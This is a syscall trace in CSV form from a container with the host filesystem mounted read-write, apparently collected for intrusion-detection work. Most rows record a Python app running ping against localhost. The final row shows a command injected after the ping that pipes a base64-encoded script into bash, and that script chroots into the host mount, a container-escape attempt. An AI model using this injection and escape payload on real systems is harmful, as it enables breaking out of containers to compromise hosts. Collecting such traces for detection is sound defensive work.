evt_time,syscall_type,container_mounts,proc_args,proc_nthreads,proc_nchilds,proc_fdopencount,proc_vmsize,evt_args
13:14:34.778908053,poll,/:/host:rw:true:rslave,app.py,2,1,6,149748,res=0 fds=
13:14:34.778980075,poll,/:/host:rw:true:rslave,app.py,2,1,6,149748,fds=3:41 timeout=500
13:14:35.279689661,poll,/:/host:rw:true:rslave,app.py,2,1,6,149748,res=0 fds=
13:14:35.279745324,poll,/:/host:rw:true:rslave,app.py,2,1,6,149748,fds=3:41 timeout=500
13:14:35.282922116,recvmsg,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,res=-11(EAGAIN) size=192 data=NULL tuple=NULL
13:14:35.282934950,sendmsg,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,fd=3(<4r>0.0.0.0:1) size=64 tuple=0.0.0.0:1->127.0.0.1:0
13:14:35.282992876,sendmsg,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,res=64 data=..........lc....5Q...................... !#$%&'()*+
13:14:35.282995591,recvmsg,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,fd=3(<4r>127.0.0.1->127.0.0.1)
13:14:35.283000640,recvmsg,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,res=84 size=84 data=E..T....@.....................lc....5Q...................... !#$%&'()*+
13:14:35.283015678,write,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,fd=1(<p>pipe:[27821]) size=57
13:14:35.283066762,write,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,res=57 data=64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.051 ms.
13:14:35.283072582,recvmsg,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,fd=3(<4r>127.0.0.1->127.0.0.1)
13:14:35.283253784,read,/:/host:rw:true:rslave,app.py,2,0,6,149748,res=57 data=64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.051 ms.
13:14:35.283261839,read,/:/host:rw:true:rslave,app.py,2,0,6,149748,fd=5(<p>pipe:[27821]) size=8029
13:14:35.780717709,poll,/:/host:rw:true:rslave,app.py,2,1,6,149748,res=0 fds=
13:14:35.780772961,poll,/:/host:rw:true:rslave,app.py,2,1,6,149748,fds=3:41 timeout=500
13:14:36.281429360,poll,/:/host:rw:true:rslave,app.py,2,1,6,149748,res=0 fds=
13:14:36.281484912,poll,/:/host:rw:true:rslave,app.py,2,1,6,149748,fds=3:41 timeout=500
13:14:36.282920750,recvmsg,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,res=-11(EAGAIN) size=192 data=NULL tuple=NULL
13:14:36.282933383,sendmsg,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,fd=3(<4r>127.0.0.1->127.0.0.1) size=64 tuple=0.0.0.0:1->127.0.0.1:0
13:14:36.282989817,sendmsg,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,res=64 data=..........lc....3Q...................... !#$%&'()*+
13:14:36.282992592,recvmsg,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,fd=3(<4r>127.0.0.1->127.0.0.1)
13:14:36.282997691,recvmsg,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,res=84 size=84 data=E..T.X..@..N..................lc....3Q...................... !#$%&'()*+
13:14:36.283013000,write,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,fd=1(<p>pipe:[27821]) size=57
13:14:36.283063651,write,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,res=57 data=64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.050 ms.
13:14:36.283069321,recvmsg,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,fd=3(<4r>127.0.0.1->127.0.0.1)
13:14:36.283247261,read,/:/host:rw:true:rslave,app.py,2,0,6,149748,res=57 data=64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.050 ms.
13:14:36.283254283,read,/:/host:rw:true:rslave,app.py,2,0,6,149748,fd=5(<p>pipe:[27821]) size=7972
13:14:36.782447050,poll,/:/host:rw:true:rslave,app.py,2,1,6,149748,res=0 fds=
13:14:36.782503274,poll,/:/host:rw:true:rslave,app.py,2,1,6,149748,fds=3:41 timeout=500
13:14:37.283117677,recvmsg,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,res=-11(EAGAIN) size=192 data=NULL tuple=NULL
13:14:37.283130891,sendmsg,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,fd=3(<4r>127.0.0.1->127.0.0.1) size=64 tuple=0.0.0.0:1->127.0.0.1:0
13:14:37.283191682,sendmsg,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,res=64 data=..........lc.....Q...................... !#$%&'()*+
13:14:37.283210417,setitimer,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,
13:14:37.283214725,setitimer,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,
13:14:37.283216228,recvmsg,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,fd=3(<4r>127.0.0.1->127.0.0.1)
13:14:37.283221567,recvmsg,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,res=84 size=84 data=E..T....@.....................lc.....Q...................... !#$%&'()*+
13:14:37.283236916,write,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,fd=1(<p>pipe:[27821]) size=57
13:14:37.283292053,write,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,res=57 data=64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.053 ms.
13:14:37.283296862,write,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,fd=1(<p>pipe:[27821]) size=1
13:14:37.283299777,write,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,res=1 data=.
13:14:37.283314334,write,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,fd=1(<p>pipe:[27821]) size=147
13:14:37.283316307,write,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,res=147 data=--- 127.0.0.1 ping statistics ---.4 packets transmitted
13:14:37.283319323,exit_group,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,
13:14:37.283376664,poll,/:/host:rw:true:rslave,app.py,2,1,6,149748,res=0 fds=
13:14:37.283434865,poll,/:/host:rw:true:rslave,app.py,2,1,6,149748,fds=3:41 timeout=500
13:14:37.283449407,read,/:/host:rw:true:rslave,app.py,2,0,6,149748,res=205 data=64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.053 ms..--- 127.0.0.1 ping sta
13:14:37.283453625,read,/:/host:rw:true:rslave,app.py,2,0,6,149748,fd=5(<p>pipe:[27821]) size=7767
13:14:37.285857703,wait4,/:/host:rw:true:rslave,-c ping -c 4 127.0.0.1 && echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLiAvdXNyL2Jpbi9zaCA8PCAiRU9UIgpwd2QKZ3JlcCBkb2NrZXIgL3Byb2MvMS9jZ3JvdXAgfCB3YyAtbApwcwpFT1QKY2QgLQ==|base64 -d |bash -,1,0,3,4504,
